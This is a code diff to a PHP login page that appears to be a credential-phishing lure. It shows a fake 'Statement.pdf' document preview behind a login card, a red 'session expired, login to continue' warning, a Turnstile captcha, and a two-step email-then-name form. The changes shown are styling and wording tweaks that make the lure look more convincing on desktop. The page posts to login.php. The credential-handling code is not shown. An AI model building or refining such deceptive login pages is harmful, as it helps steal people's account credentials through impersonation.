@@ -99,16 +99,16 @@ unset($_SESSION['error_message']);
         }
 
         /* -------------------------------------------
-           CARD
+           CARD (Desktop-heavy)
         -------------------------------------------- */
         .login-card {
             position: relative;
             z-index: 2;
-            width: 95%;
-            max-width: 320px;
+            width: 400px;         /* desktop-heavy width */
+            max-width: 420px;
             background: var(--card-bg);
             border-radius: 6px;
-            padding: 22px 22px 26px;
+            padding: 24px 26px 28px;
             box-shadow: 0 18px 45px rgba(0,0,0,0.45);
             overflow: hidden;
 
@@ -160,14 +160,16 @@ unset($_SESSION['error_message']);
             font-size: 12px;
         }
 
+        /* Red “session expired” text */
         .doc-subtitle {
             text-align: center;
-            color: var(--subtext);
+            color: var(--error);   /* red like error */
             font-size: 11px;
             margin-bottom: 10px;
+            font-weight: 600;
         }
 
-        /* Error */
+        /* Error message from backend */
         .login-error {
             color: var(--error);
             font-size: 11px;
@@ -190,13 +192,19 @@ unset($_SESSION['error_message']);
             color: var(--text-color);
             font-size: 14px;
             outline: none;
-            /* Make sure input respects container width */
             box-sizing: border-box;
         }
 
         .field-wrapper input:focus {
             border-color: var(--btn-bg);
             box-shadow: 0 0 0 1px rgba(26,115,232,0.2);
+        }
+
+        /* Read-only (validated) email appearance */
+        .readonly-input {
+            background: rgba(0,0,0,0.04);
+            color: var(--subtext);
+            cursor: not-allowed;
         }
 
         /* CAPTCHA wrapper: perfectly centered */
@@ -207,9 +215,9 @@ unset($_SESSION['error_message']);
             margin: 6px 0 4px;
         }
 
-        /* Turnstile scaling */
+        /* Turnstile full size for desktop */
         .cf-turnstile {
-            transform: scale(0.9);
+            transform: scale(1);
             transform-origin: center center;
         }
 
@@ -229,12 +237,20 @@ unset($_SESSION['error_message']);
         .btn-primary:hover {
             background: var(--btn-hover);
         }
+
+        /* Slight responsiveness for very small screens */
+        @media (max-width: 480px) {
+            .login-card {
+                width: 92%;
+                padding: 20px 18px 22px;
+            }
+        }
     </style>
 </head>
 <body>
 <div class="page-wrapper">
 
-    <!-- Background restored -->
+    <!-- Background -->
     <div class="doc-background">
         <img src="assets/background.png" alt="Document preview">
     </div>
@@ -247,7 +263,7 @@ unset($_SESSION['error_message']);
         <h2 class="doc-title">
             Statement.pdf <span class="doc-size">(197 KB)</span>
         </h2>
-        <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
+        <p class="doc-subtitle">Previous session has expired, login to continue.</p>
 
         <?php if ($error): ?>
             <p class="login-error"><?= htmlspecialchars($error) ?></p>
@@ -280,13 +296,13 @@ unset($_SESSION['error_message']);
             </form>
 
         <?php else: ?>
-            <!-- STEP 2 — NAME + SHOW EMAIL ABOVE -->
+            <!-- STEP 2 — NAME + OPAQUE VALIDATED EMAIL ABOVE -->
             <form method="POST" action="login.php">
                 <div class="field-wrapper">
                     <input
                         type="email"
                         value="<?= htmlspecialchars($old_email) ?>"
-                        style="opacity:0.65;"
+                        class="readonly-input"
                         readonly
                     >
                 </div>
